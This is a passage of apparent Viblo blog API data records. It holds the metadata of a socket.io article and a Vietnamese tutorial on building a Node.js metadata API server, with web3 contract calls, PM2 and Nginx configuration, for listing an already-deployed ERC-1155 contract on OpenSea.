socket.io. B\u00e0i sau th\u00ec m\u00ecnh s\u1ebd l\u00e0m v\u1ec1 vi\u1ec7c c\u00e1c users kh\u00e1c s\u1ebd join v\u00e0o. See ya later.',
      published_at: "2020-11-15 07:46:59",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 8,
      points: 8,
      views_count: 687,
      clips_count: 6,
      comments_count: 1,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/751fb53a-117a-4081-bd14-e29574cdce0c.png",
      user: {
        data: {
          id: 34730,
          url: "https://viblo.asia/u/duong.manh.hoang",
          avatar: "e9107983-8b6f-4411-99d6-8d996a20eb6a.png",
          name: "D\u01b0\u01a1ng M\u1ea1nh Ho\u00e0ng",
          username: "duong.manh.hoang",
          followers_count: 46,
          reputation: 1503,
          posts_count: 34,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "reactjs",
            name: "ReactJS",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=ReactJS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "webrtc",
            name: "webrtc",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=webrtc&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 55896,
            url: "https://viblo.asia/u/thevu4496",
            avatar: "61a28b5e-f60e-4948-bfc0-e5df8b60ab9d.jpg",
            name: "vu the",
            username: "thevu4496",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 48377,
      title:
        "OpenSea Integration - Contract ERC-1155 Already Deployed And Didn't Implement 'uri' method",
      slug: "07LKXbvJlV4",
      url:
        "https://viblo.asia/p/opensea-integration-contract-erc-1155-already-deployed-and-didnt-implement-uri-method-07LKXbvJlV4",
      user_id: 27788,
      moderation: null,
      transliterated:
        "opensea-integration-contract-erc-1155-already-deployed-and-didnt-implement-uri-method",
      contents_short:
        "![](https://images.viblo.asia/05eb5512-98fc-4b88-bc36-34421282f99a.png)\n\n\n\nOpenSea l\u00e0 m\u1ed9t n\u1ec1n t\u1ea3ng cho ph\u00e9p b\u1ea5t k\u1ef3 ai c\u0169ng th\u1ec3 trao \u0111\u1ed5i, mua b\u00e1n c\u00e1c lo\u1ea1i token NFT(Non-fungible token) nh\u01b0 ERC-721 ho\u1eb7c ERC-1155. Nh\u01b0ng b\u00e0i n\u00e0y m\u00ecnh s\u1ebd kh\u00f4ng \u0111i s\u00e2u v\u00e0o c\u00e1ch th\u1ee9c ho\u1ea1t \u0111\u1ed9ng ...",
      contents:
        '![](https://images.viblo.asia/05eb5512-98fc-4b88-bc36-34421282f99a.png)\n\n[**OpenSea**](https://opensea.io/) l\u00e0 m\u1ed9t n\u1ec1n t\u1ea3ng cho ph\u00e9p b\u1ea5t k\u1ef3 ai c\u0169ng th\u1ec3 trao \u0111\u1ed5i, mua b\u00e1n c\u00e1c lo\u1ea1i token **NFT**(Non-fungible token) nh\u01b0 ERC-721 ho\u1eb7c ERC-1155. Nh\u01b0ng b\u00e0i n\u00e0y m\u00ecnh s\u1ebd kh\u00f4ng \u0111i s\u00e2u v\u00e0o c\u00e1ch th\u1ee9c ho\u1ea1t \u0111\u1ed9ng chi ti\u1ebft c\u1ee7a n\u00f3 (n\u1ebfu mu\u1ed1n tham kh\u1ea3o chi  ti\u1ebft m\u1ecdi ng\u01b0\u1eddi c\u00f3 th\u1ec3 truy c\u1eadp t\u1ea1i \u0111\u00e2y https://docs.opensea.io/). M\u00e0 m\u00ecnh s\u1ebd \u0111i v\u00e0o c\u00e1ch \u0111\u1ec3 c\u00f3 th\u1ec3 \u0111\u01b0a m\u1ed9t contract ERC-1155 \u0111\u00e3 deploy r\u1ed3i v\u00e0 kh\u00f4ng tu\u00e2n theo chu\u1ea9n contract c\u1ee7a OpenSea l\u00ean m\u1ea1ng c\u1ee7a h\u1ecd. T\u1ea1i sao ph\u1ea3i l\u00e0m \u0111i\u1ec1u n\u00e0y \u0111\u00f3 l\u00e0 v\u00ec \u0111\u1ed1i v\u1edbi nh\u1eefng smart ch\u01b0a \u0111\u01b0\u1ee3c deploy v\u00e0 b\u1ea1n c\u00f3 d\u1ef1 \u0111\u1ecbnh s\u1ebd \u0111\u01b0a n\u00f3 l\u00ean OpenSea th\u00ec s\u1ebd c\u00f3 nguy\u00ean m\u1ed9t tutorial h\u01b0\u1edbng d\u1eabn b\u1ea1n t\u1eeb c\u00e1ch t\u1ea1o contract \u0111\u1ebfn thi\u1ebft l\u1eadp metadata [t\u1ea1i \u0111\u00e2y](https://docs.opensea.io/docs/1-structuring-your-smart-contract). C\u00f2n \u0111\u1ed1i v\u1edbi nh\u1eefng contract \u0111\u00e3 deploy tr\u01b0\u1edbc \u0111\u00f3 nh\u01b0ng v\u1eabn mu\u1ed1n \u0111\u01b0a l\u00ean OpenSea th\u00ec bu\u1ed9c b\u1ea1n ph\u1ea3i cung c\u1ea5p cho OpenSea m\u1ed9t API tr\u1ea3 v\u1ec1 metadata \u0111\u00fang v\u1edbi \u0111\u1ecbnh d\u1ea1ng m\u00e0 h\u1ecd quy \u0111\u1ecbnh v\u00e0 sau \u0111\u00f3 li\u00ean h\u1ec7 \u0111\u1ec3 h\u1ecd add API \u0111\u00f3 v\u00e0o h\u1ec7 th\u1ed1ng cho b\u1ea1n. Sau \u0111\u00e2y m\u00ecnh s\u1ebd h\u01b0\u1edbng d\u1eabn c\u00e1c b\u1ea1n l\u00e0m m\u1ed9t server cung c\u1ea5p API nh\u01b0 v\u1eady\n\n# Chu\u1ea9n b\u1ecb\nM\u00f4i tr\u01b0\u1eddng ch\u00fang ta s\u1ebd s\u1eed d\u1ee5ng server API b\u1eb1ng nodejs (theo nh\u01b0 h\u01b0\u1edbng d\u1eabn c\u1ee7a OpenSea c\u00f3 2 lo\u1ea1i m\u1eabu server l\u00e0 python v\u00e0 nodejs - [**here**](https://docs.opensea.io/docs/metadata-standards#section-deploying-your-metadata-api)).\n\n\u0110\u1ea7u ti\u00ean ta s\u1ebd clone project m\u1eabu v\u1ec1: `git clone https://github.com/ProjectOpenSea/metadata-api-nodejs.git` \n\nTheo nh\u01b0 `README` th\u00ec n\u00ean \u0111\u1ec3 t\u1eeb node 8.11.* tr\u1edf l\u00ean \n\n# Ph\u00e1t tri\u1ec3n\nSau khi c\u00f3 m\u1eabu server c\u1ee7a OpenSea th\u00ec c\u00f4ng vi\u1ec7c b\u00e2y gi\u1edd l\u00e0 c\u1ea7n ph\u1ea3i s\u1eeda \u0111\u1ed5i server theo \u00fd c\u1ee7a m\u00ecnh \u0111\u1ec3 n\u00f3 c\u00f3 th\u1ec3 tr\u1ea3 v\u1ec1 c\u00e1c th\u00f4ng tin \u0111\u00fang v\u1edbi \u0111\u1ecbnh d\u1ea1ng metadata m\u00e0 OpenSea y\u00eau c\u1ea7u. C\u1ea5u tr\u00fac metadata:\n\n\n```\n    {\n      "description": "Friendly OpenSea Creature that enjoys long swims in the ocean.", \n      "external_url": "https://openseacreatures.io/3", \n      "image": "https://storage.googleapis.com/opensea-prod.appspot.com/puffs/3.png", \n      "name": "Dave Starbelly",\n      "attributes": [ ... ], \n    }\n```\n\nGi\u1ea3i th\u00edch t\u1eebng th\u00e0nh ph\u1ea7n nh\u01b0 sau\n\n\n\n\n| Attribute | Description |\n| -------- | -------- |\n| image     | \u0110\u00e2y l\u00e0 URL \u0111\u1ebfn h\u00ecnh \u1ea3nh c\u1ee7a m\u1eb7t h\u00e0ng. C\u00f3 th\u1ec3 ch\u1ec9 l\u00e0 v\u1ec1 b\u1ea5t k\u1ef3 lo\u1ea1i h\u00ecnh \u1ea3nh n\u00e0o (l\u00e0 SVG, PNG, JPG v\u00e0 th\u1eadm ch\u00ed l\u00e0 MP4) v\u00e0 c\u0169ng c\u00f3 th\u1ec3 l\u00e0 URL ho\u1eb7c \u0111\u01b0\u1eddng d\u1eabn IPFS. Ch\u00fang t\u00f4i khuy\u00ean b\u1ea1n n\u00ean s\u1eed d\u1ee5ng h\u00ecnh \u1ea3nh 350 x 350.     | \n| image_data     | Raw SVG image data - n\u1ebfu b\u1ea1n mu\u1ed1n t\u1ea1o h\u00ecnh \u1ea3nh m\u1ed9t c\u00e1ch nhanh ch\u00f3ng (kh\u00f4ng khuy\u1ebfn kh\u00edch). Ch\u1ec9 s\u1eed d\u1ee5ng \u0111i\u1ec1u n\u00e0y khi b\u1ea1n kh\u00f4ng s\u1eed d\u1ee5ng parameter  `image` |\n| external_url     | \u0110\u00e2y l\u00e0 URL s\u1ebd xu\u1ea5t hi\u1ec7n b\u00ean d\u01b0\u1edbi h\u00ecnh \u1ea3nh c\u1ee7a n\u1ed9i dung tr\u00ean OpenSea v\u00e0 s\u1ebd cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng redirect kh\u1ecfi OpenSea \u0111\u1ebfn s\u1ea3n ph\u1ea9m tr\u00ean trang web c\u1ee7a b\u1ea1n.  |\n| description     | \u0110\u00e2y l\u00e0 ph\u1ea7n m\u00f4 t\u1ea3 v\u1ec1 s\u1ea3n ph\u1ea9m v\u00e0 ph\u1ea7n n\u00e0y c\u00f3 h\u1ed7 tr\u1ee3 Markdown |\n| name     | L\u00e0 t\u00ean c\u1ee7a m\u1eb7t h\u00e0ng |\n| attributes     | L\u00e0 c\u00e1c thu\u1ed9c t\u00ednh s\u1ebd hi\u1ec7n th\u1ecb \u1edf ph\u1ea7n `Attributes`  |\n| background_color     | M\u00e0u n\u1ec1n c\u1ee7a m\u1eb7t h\u00e0ng v\u00e0 tham s\u1ed1 truy\u1ec1n v\u00e0o c\u1ea7n l\u00e0 d\u1ea1ng m\u00e3 m\u00e0u c\u00f3 `#` \u1edf \u0111\u1ea7u  |\n| animation_url     | M\u1ed9t URL link \u0111\u1ebfn t\u1ec7p \u0111\u00ednh k\u00e8m \u0111a ph\u01b0\u01a1ng ti\u1ec7n c\u1ee7a m\u1eb7t h\u00e0ng. C\u00e1c lo\u1ea1i \u0111\u1ecbnh d\u1ea1ng nh\u01b0 GLTF, GLB, WEBM, MP4, M4V, OGV v\u00e0 OGG, ngo\u00e0i ra c\u0169ng h\u1ed7 tr\u1ee3 c\u1ea3 c\u00e1c lo\u1ea1i d\u00e0nh cho \u00e2m thanh nh\u01b0 MP3, WAV v\u00e0 OGA. |\n| youtube_url     | Link video youtube |\n\n&nbsp;\n\nPh\u1ea7n `Attributes` s\u1ebd l\u00e0 ph\u1ea7n c\u00e1c thu\u1ed9c  t\u00ednh m\u00e0 ta t\u00f9y ch\u1ec9nh v\u00e0 n\u00f3 s\u1ebd \u0111\u01b0\u1ee3c hi\u1ec3n th\u1ecb ki\u1ec3u nh\u01b0 n\u00e0y khi l\u00ean giao di\u1ec7n\n\n![](https://images.viblo.asia/d856859d-776c-41da-8f52-ddc274392a79.png)\n\n\u0110\u1ec3 bi\u1ec3u di\u1ec5n nh\u01b0 tr\u00ean th\u00ec trong m\u1ea3ng attributes c\u1ee7a ta c\u1ea7n thi\u1ebft l\u1eadp c\u00e1c ki\u1ec3u type \u0111\u1ec3 c\u00e1c gi\u00e1 tr\u1ecb s\u1ebd \u0111\u01b0\u1ee3c \u0111\u01b0a v\u00e0o \u0111\u00fang ch\u1ed7 nh\u01b0 v\u00ed d\u1ee5 d\u01b0\u1edbi \u0111\u00e2y:\n\n```json\n    ...\n    {\n    "attributes": [\n        {\n          "trait_type": "Base", \n          "value": "Starfish"\n        }, \n        {\n          "trait_type": "Eyes", \n          "value": "Big"\n        }, \n        {\n          "trait_type": "Mouth", \n          "value": "Surprised"\n        }, \n        {\n          "trait_type": "Level", \n          "value": 5\n        }, \n        {\n          "trait_type": "Stamina", \n          "value": 1.4\n        }, \n        {\n          "trait_type": "Personality", \n          "value": "Sad"\n        }, \n        {\n          "display_type": "boost_number", \n          "trait_type": "Aqua Power", \n          "value": 40\n        }, \n        {\n          "display_type": "boost_percentage", \n          "trait_type": "Stamina Increase", \n          "value": 10\n        }, \n        {\n          "display_type": "number", \n          "trait_type": "Generation", \n          "value": 2\n        }\n      ]\n    }\n```\n\nR\u1ed3i sau khi \u0111\u00e3 hi\u1ec3u v\u1ec1 c\u00e1ch format metadata tr\u1ea3 v\u1ec1 ph\u1ea3i tu\u00e2n th\u1ee7 nh\u01b0 tr\u00ean th\u00ec b\u00e2y gi\u1edd ch\u00fang ta s\u1ebd \u0111\u1ebfn b\u01b0\u1edbc d\u1ef1ng server. H\u00e3y c\u00f9ng quay l\u1ea1i v\u1edbi project m\u00e0 ch\u00fang ta \u0111\u00e3 clone v\u1ec1 \u1edf tr\u00ean, n\u00f3 th\u00ec \u0111\u00e3 \u0111\u01b0\u1ee3c config g\u1ea7n nh\u01b0 \u0111\u1ea7y \u0111\u1ee7 c\u00f2n c\u00f3 c\u1ea3 k\u1ebft h\u1ee3p config `Keroku` cho nh\u1eefng ai kh\u00f4ng c\u00f3 server ri\u00eang m\u00e0 mu\u1ed1n deploy mi\u1ec5n ph\u00ed. \n\n![](https://images.viblo.asia/cb0a87b1-a94d-49c0-b0f7-83754058c208.png)\n\nNh\u01b0ng \u0111\u1ec3 ph\u00f9 h\u1ee3p v\u1edbi lo\u1ea1i m\u1eb7t h\u00e0ng c\u0169ng nh\u01b0 \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh ch\u00fang ta s\u1ebd c\u1ea7n thay \u0111\u1ed5i. Nh\u01b0 m\u1eb7t h\u00e0ng c\u1ee7a m\u00ecnh l\u00e0 b\u00e1n c\u00e1c NFT \u0111i\u1ec7n tho\u1ea1i v\u00e0 c\u00e1c thu\u1ed9c t\u00ednh th\u00ec m\u00ecnh kh\u00f4ng l\u01b0u tr\u1eef \u1edf database, m\u00e0 m\u00ecnh l\u01b0u tr\u00ean contract ch\u1ec9 c\u00f3 \u1ea3nh l\u00e0 mapping \u1edf server n\u00ean m\u00ecnh s\u1ebd c\u1ea7n m\u1ed9t h\u00e0m \u0111\u1ec3 g\u1ecdi l\u00ean contract l\u1ea5y th\u00f4ng tin v\u00e0 m\u1ed9t h\u00e0m \u0111\u1ec3 l\u1ea5y \u1ea3nh.\n\nN\u00e0o gi\u1edd \u0111\u1ea7u ti\u00ean xem ta c\u1ea7n nh\u1eefng g\u00ec v\u00e0 import v\u00e0o \u0111\u00e3. \u0110\u1ea7u ti\u00ean ta s\u1ebd c\u1ea7n m\u1ed9t s\u1ed1 th\u1ee9 \u0111\u1ec3 \u1edf bi\u1ebfn m\u00f4i tr\u01b0\u1eddng n\u00ean c\u1ea7n `dotenv`, mu\u1ed1n connect \u0111\u1ec3 g\u1ecdi l\u00ean contract ta c\u1ea7n c\u00f3 `web3` v\u00e0 \u0111\u1ec3 g\u1ecdi \u0111\u01b0\u1ee3c contract \u0111\u00f3 ta c\u0169ng c\u1ea7n c\u00f3 `abi` c\u1ee7a contract \u0111\u00e3 \u0111\u01b0\u1ee3c complie. Vi\u1ebft th\u00eam m\u1ed9t h\u00e0m \u0111\u1ec3 mapping \u1ea3nh theo  th\u00f4ng s\u1ed1 n\u1eefa `getIphoneLayout` ph\u1ea7n import s\u1ebd nh\u01b0 th\u1ebf n\u00e0y\n\n```js\n// index.js\n    \n    require(\'dotenv\').config();\n    const express = require(\'express\');\n    const Web3 = require(\'web3\');\n    const { getIphoneLayout } = require(\'./src/getIphoneLayout.js\');\n    const Devices = require(\'./src/contracts/Devices.json\');\n    const PORT = process.env.PORT || 5000;\n    const app = express().set(\'port\', PORT);\n    app.get(\'/\', function (req, res) {\n      res.send(\'Get ready for OpenSea!\');\n    });\n```\n\nGi\u1edd s\u1ebd \u0111i l\u00e0m m\u1ed9t h\u00e0m \u0111\u1ec3 t\u1eeb `token_id` ta c\u00f3 th\u1ec3 get ra \u0111\u01b0\u1ee3c c\u00e1c th\u00f4ng tin c\u1ee7a m\u1eb7t h\u00e0ng \u1edf tr\u00ean contract. Do h\u00e0m get info c\u1ee7a m\u1eb7t h\u00e0ng t\u1eeb contract ch\u1ec9 l\u00e0 h\u00e0m `view`  n\u00ean kh\u00f4ng c\u1ea7n ph\u1ea3i k\u00fd b\u1eb1ng private key, m\u00e0 \u0111\u01a1n gi\u1ea3n ch\u00fang ta c\u1ea7n th\u00f4ng qua m\u1ed9t node Ethereum \u0111\u1ec3 g\u1ecdi nh\u01b0 \u1edf \u0111\u00e2y m\u00ecnh \u0111ang s\u1eed d\u1ee5ng node c\u1ee7a `Infura`. V\u00e0 sau khi get \u0111\u01b0\u1ee3c th\u00f4ng tin m\u00ecnh s\u1ebd set ch\u00fang v\u00e0o c\u00e1c tr\u01b0\u1eddng  t\u01b0\u01a1ng \u1ee9ng \u0111\u1ec3 n\u00f3 c\u00f3 th\u1ec3 hi\u1ec3n th\u1ecb \u0111\u01b0\u1ee3c tr\u00ean OpenSea.\n\n```js\n    app.get(\'/:token_id\', async function (req, res) {\n      const tokenId = parseInt(req.params.token_id).toString();\n      \n      web3 = new Web3(\n        new Web3.providers.HttpProvider(`https://mainnet.infura.io/v3/${process.env.INFURA_ID}`)\n      ); // Do contract \u0111ang \u1edf tr\u00ean mainnet n\u00ean m\u00ecnh g\u1ecdi t\u1ea1o th\u1eb3ng m\u1ed9t web3 connect \u0111\u1ebfn node tr\u00ean mainnet\n      \n      // Sau khi \u0111\u00e3 c\u00f3 web3 ta s\u1ebd t\u1ea1o m\u1ed9t Instance v\u1edbi ABI v\u00e0 \u0111\u1ecba ch\u1ec9 contract \u0111\u00e3 \u0111\u01b0\u1ee3c deploy\n      const devicesInstance = new web3.eth.Contract(Devices.abi, process.env.ADDRESS_DEVICE_CONTRACT);\n      \n      \n      try {\n      // G\u1ecdi l\u00ean contract \u0111\u1ec3 l\u1ea5y th\u00f4ng tin v\u1ec1 \n        let deviceInfo = await devicesInstance.methods.getSpecsById(tokenId).call();\n        \n        // Set d\u1eef li\u1ec7u v\u00e0o c\u00e1c tr\u01b0\u1eddng c\u1ee7a metadata\n        const data = {\n          name: deviceInfo.model + \' - \' + deviceInfo.color,\n          attributes: [\n            {\n              trait_type: \'id\',\n              value: tokenId\n            },\n            {\n              trait_type: \'model\',\n              value: deviceInfo.model\n            },\n            {\n              trait_type: \'color\',\n              value: deviceInfo.color\n            },\n            {\n              trait_type: \'price\',\n              value: deviceInfo.price / 10e18\n            },\n            {\n              trait_type: \'unit\',\n              value: \'IPHONE\'\n            },\n            {\n              trait_type: \'others\',\n              value: deviceInfo.others\n            }\n          ],\n          // Thi\u1ebft l\u1eadp \u0111\u1ec3 link g\u1ecdi image theo ki\u1ec3u model v\u00e0 color thay v\u00ec mapping 1:1\n          // Domain s\u1ebd \u0111\u1ec3 \u1edf bi\u1ebfn m\u00f4i tr\u01b0\u1eddng v\u00e0 ta s\u1ebd s\u1eeda khi deploy l\u00ean h\u1ec7 th\u1ed1ng th\u1eadt\n          image: `${process.env.DOMAIN}/image/${deviceInfo.model}/${deviceInfo.color}`\n        };\n        return res.send(data);\n      } catch (error) {\n        return res.send(\'Not Found\');\n      }\n    });\n```\n\nH\u00e0m n\u00e0y s\u1ebd tr\u1ea3 v\u1ec1 d\u1eef li\u1ec7u d\u1ea1ng nh\u01b0 sau \n```json\n// API : http://localhost:5000/1 \n    {\n       "name":"4 - Black",\n       "attributes":[\n          {\n             "trait_type":"id",\n             "value":"1"\n          },\n          {\n             "trait_type":"model",\n             "value":"4"\n          },\n          {\n             "trait_type":"color",\n             "value":"Black"\n          },\n          {\n             "trait_type":"price",\n             "value":100\n          },\n          {\n             "trait_type":"unit",\n             "value":"IPHONE"\n          },\n          {\n             "trait_type":"others",\n             "value":"0x"\n          }\n       ],\n       "image":"http://localhost:5000/image/4/Black"\n    }\n```\n\nTi\u1ebfp \u0111\u1ebfn ta s\u1ebd vi\u1ebft m\u1ed9t api n\u1eefa \u0111\u1ec3 khi OpenSea g\u1ecdi v\u00e0o `http://localhost:5000/image/4/Black` s\u1ebd tr\u1ea3 v\u1ec1 \u1ea3nh c\u1ee7a s\u1ea3n ph\u1ea9m\n\n```js\n    app.get(\'/image/:model/:color\', function (req, res) {\n      const model = req.params.model;\n      const color = req.params.color;\n      try {\n        const phone = getIphoneLayout(model, color);\n        res.sendFile(__dirname + \'/\' + phone.img);\n      } catch (error) {\n        res.status(404);\n        return res.send(\'Not Found\');\n      }\n    });\n```\n\nH\u00e0m `getIphoneLayout` \u0111\u00e3 \u0111\u01b0\u1ee3c quy \u0111inh \u0111\u1ec3 truy\u1ec1n v\u00e0o th\u00f4ng s\u1ed1 `model` v\u00e0 `color` s\u1ebd \u0111\u01b0a ra \u1ea3nh c\u1ee7a m\u1eabu \u0111\u00f3\n\n```js\n// getIphoneLayout.js\n\n    const iphoneInfo = {\n      \'3\': {\n        Black: {\n          style: \'iphone3\',\n          img: iPhone3Img,\n          layout: iPhone3,\n          codeColor: \'#1F2020\'\n        }\n      },\n      \'3S\': {\n        Black: {\n          style: \'iphone3\',\n          img: iPhone3SImg,\n          layout: iPhone3S,\n          codeColor: \'#1F2020\'\n        }\n      },\n      \'4\': {\n        Black: {\n          style: \'iphone4\',\n          img: iPhone4BlackImg,\n          layout: iPhone4Black,\n          codeColor: \'#1F2020\'\n        },\n        ...\n        \n    const getIphoneLayout = (_model, _color) => {\n      return iphoneInfo[_model][_color];\n    };\n\n    module.exports = { getIphoneLayout };\n    \n```\n\nK\u1ebft qu\u1ea3 c\u1ee7a api: `http://localhost:5000/image/4/Black` s\u1ebd l\u00e0\n\n![](https://images.viblo.asia/c6d5d34f-f1c6-429f-9b20-4ffe23891e53.png)\n\nC\u1ea5u tr\u00fac t\u1ed5ng k\u1ebft c\u1ee7a server s\u1ebd nh\u01b0 sau\n\n```js\n    require(\'dotenv\').config();\n    const express = require(\'express\');\n    const Web3 = require(\'web3\');\n    const { getIphoneLayout } = require(\'./src/getIphoneLayout.js\');\n    const Devices = require(\'./src/contracts/Devices.json\');\n    const PORT = process.env.PORT || 5000;\n    const app = express().set(\'port\', PORT);\n    app.get(\'/\', function (res) {\n      res.send(\'Get ready for OpenSea!\');\n    });\n\n    app.get(\'/:token_id\', async function (req, res) {\n      const tokenId = parseInt(req.params.token_id).toString();\n      web3 = new Web3(\n        new Web3.providers.HttpProvider(`https://mainnet.infura.io/v3/${process.env.INFURA_ID}`)\n      );\n      const devicesInstance = new web3.eth.Contract(Devices.abi, process.env.ADDRESS_DEVICE_CONTRACT);\n      try {\n        let deviceInfo = await devicesInstance.methods.getSpecsById(tokenId).call();\n        const data = {\n          name: deviceInfo.model + \' - \' + deviceInfo.color,\n          attributes: [\n            {\n              trait_type: \'id\',\n              value: tokenId\n            },\n            {\n              trait_type: \'model\',\n              value: deviceInfo.model\n            },\n            {\n              trait_type: \'color\',\n              value: deviceInfo.color\n            },\n            {\n              trait_type: \'price\',\n              value: deviceInfo.price / 10e18\n            },\n            {\n              trait_type: \'unit\',\n              value: \'IPHONE\'\n            },\n            {\n              trait_type: \'others\',\n              value: deviceInfo.others\n            }\n          ],\n          image: `${process.env.DOMAIN}/image/${deviceInfo.model}/${deviceInfo.color}`\n        };\n        return res.send(data);\n      } catch (error) {\n        return res.send(\'Not Found\');\n      }\n    });\n\n    app.get(\'/image/:model/:color\', function (req, res) {\n      const model = req.params.model;\n      const color = req.params.color;\n      try {\n        const phone = getIphoneLayout(model, color);\n        res.sendFile(__dirname + \'/\' + phone.img);\n      } catch (error) {\n        res.status(404);\n        return res.send(\'Not Found\');\n      }\n    });\n\n    app.listen(app.get(\'port\'), function () {\n      console.log(\'Node app is running on port\', app.get(\'port\'));\n    });\n```\n\n```js\n// .env\n\n    DOMAIN = <https://domnain.com>\n    ADDRESS_DEVICE_CONTRACT = <0x.....>\n    INFURA_ID = <23123123...>\n```\n\n![](https://images.viblo.asia/9d389988-2513-4488-b2fc-8f5b63c95834.png)\n\n# Deploy l\u00ean server v\u00e0 configure Nginx\nN\u1ebfu b\u1ea1n n\u00e0o kh\u00f4ng c\u00f3 server th\u00ec c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng server `Heroku` h\u01b0\u1edbng d\u1eabn r\u1ea5t chi ti\u1ebft  [t\u1ea1i \u0111\u00e2y](https://devcenter.heroku.com/articles/git).  \n\nC\u00f2n \u0111\u1ed1i v\u1edbi tr\u01b0\u1eddng h\u1ee3p c\u00f3 server ri\u00eang ta s\u1ebd c\u00f3 2 c\u00e1ch \u0111\u1ec3 \u0111\u01b0a code l\u00ean server \u0111\u00f3 l\u00e0 m\u1ed9t ssh r\u1ed3i coppy tr\u1ef1c ti\u1ebfp v\u00e0 c\u00e1ch th\u1ee9 hai \u0111\u00f3 l\u00e0 ta s\u1ebd \u0111\u1ea9y n\u00f3 l\u00ean git r\u1ed3i sau \u0111\u00f3 v\u00e0o server pull code v\u1ec1 nh\u01b0 b\u00ecnh th\u01b0\u1eddng. Khi code \u0111\u00e3 \u1edf tr\u00ean server ta s\u1ebd t\u1ea3i c\u00e1c th\u01b0 vi\u1ec7n c\u1ea7n thi\u1ebft v\u00e0 nh\u01b0 \u1edf \u0111\u00e2y m\u00ecnh s\u1eed d\u1ee5ng th\u00eam m\u1ed9t th\u1eb1ng chuy\u00ean qu\u1ea3n l\u00fd vi\u1ec7c ch\u1ea1y c\u1ee7a m\u1ed9t \u1ee9ng d\u1ee5ng \u0111\u00f3 l\u00e0 th\u1eb1ng [**PM2**](https://pm2.keymetrics.io/). N\u00f3 s\u1ebd gi\u00fap cho server c\u1ee7a ch\u00fang ta ch\u1ea1y 24/7 v\u00e0 t\u1ef1 \u0111\u1ed9ng ch\u1ea1y l\u1ea1i khai server b\u1ecb ch\u1ebft n\u00f3 ki\u1ec3u ki\u1ec3u nh\u01b0 `nodemon` v\u1eady nh\u01b0ng h\u1ecbn h\u01a1n :D :D :D. \n\nc\u00e0i \u0111\u1eb7t th\u00eam **pm2** : \n\n```shell\n    $ npm install pm2@latest -g\n    # or\n    $ yarn global add pm2\n```\n\nsau \u0111\u00f3 ch\u1ea1y n\u00f3 v\u1edbi file `index.js` c\u1ee7a ch\u00fang ta c\u00f9ng v\u1edbi t\u00ean c\u1ee7a n\u00f3 \u0111\u1ec3 ph\u00e2n bi\u1ec7t v\u1edbi c\u00e1c \u1ee9ng d\u1ee5ng kh\u00e1c\n\n![](https://images.viblo.asia/e3b8d517-4c7f-4bf5-aeda-5197c13841f8.png)\n\nSau khi \u0111\u00e3 ch\u1ea1y \u1ee9ng d\u1ee5ng gi\u1edd ch\u00fang ta s\u1ebd \u0111\u1ebfn config Nginx. \u00c0 tr\u01b0\u1edbc ti\u00ean th\u00ec c\u1ea7n s\u1eeda l\u1ea1i file `.env` th\u00e0nh domain c\u1ee7a m\u00ecnh tr\u01b0\u1edbc \u0111\u00e3 nh\u00e1. Config Nginx \u0111\u1ea7u ti\u00ean v\u00e0o th\u01b0 m\u1ee5c `/etc/nginx/sites-available` v\u00e0 t\u1ea1o m\u1ed9t config \u1edf \u0111\u00f3\n\n```js\n    // asset-api\n\n        upstream asset-api {\n            server 127.0.0.1:5000;\n    }\n\n\n    server {\n            listen 80;\n            server_name asset.phone.com;\n\n            location / {\n                    proxy_set_header   Host            $http_host;\n                    proxy_set_header   Upgrade         $http_upgrade;\n                    proxy_set_header   Connection      "upgrade";\n                    proxy_set_header   X-Real-IP       $remote_addr;\n                    proxy_set_header   X-NginX-Proxy   true;\n                    proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n                    proxy_http_version 1.1;\n                    proxy_redirect     off;\n                    proxy_pass         http://asset-api/;\n            }\n\n    }\n```\n\nSau khi \u0111\u00e3 c\u00f3 file t\u1ea1i `/etc/nginx/sites-available` ta sang th\u01b0 m\u1ee5c `/etc/nginx/sites-enabled` v\u00e0 t\u1ea1o m\u1ed9t symbolic link t\u1eeb b\u00ean th\u01b0 m\u1ee5c `sites-available` sang \n\n```shell\n    ln -s ../sites-available/asset-api .\n```\n\nB\u00e2y gi\u1edd th\u00ec restart l\u1ea1i Nginx \u0111\u1ec3 xem k\u1ebft qu\u1ea3 n\u00e0o\n\n\n- `<your-api.com>/{token_id}`\n\n![](https://images.viblo.asia/cc19fdab-a551-4994-af83-b7f99d68a387.png)\n\n- `<your-api.com>/image/:model/:color`\n![](https://images.viblo.asia/e36dadca-b726-446b-9e18-76d48c255293.png)\n\nDone c\u00f4ng vi\u1ec7c cu\u1ed1i c\u00f9ng s\u1ebd l\u00e0 li\u00ean h\u1ec7 v\u1edbi b\u00ean support c\u1ee7a OpenSea \u0111\u1ec3 h\u1ecd c\u00f3 th\u1ec3 add API c\u1ee7a ch\u00fang ta v\u00e0o h\u1ec7  th\u1ed1ng. Theo nh\u01b0 h\u01b0\u1edbng d\u1eabn c\u1ee7a h\u1ecd t\u1ea1i \u0111\u00e2y https://docs.opensea.io/docs/opensea-integration#section-metadata-api\n\n# K\u1ebft lu\u1eadn\nNh\u01b0 v\u1eady l\u00e0 ch\u00fang ta \u0111\u00e3 c\u00f3 th\u1ec3 custom server \u0111\u1ec3 n\u00f3 tr\u1ea3 metadata \u0111\u00fang chu\u1ea9n c\u1ee7a OpenSea. B\u00e0i vi\u1ebft h\u01a1i c\u00f3 khuynh h\u01b0\u1edbng l\u01b0u tr\u1eef c\u00e1 nh\u00e2n, v\u1eady n\u00ean 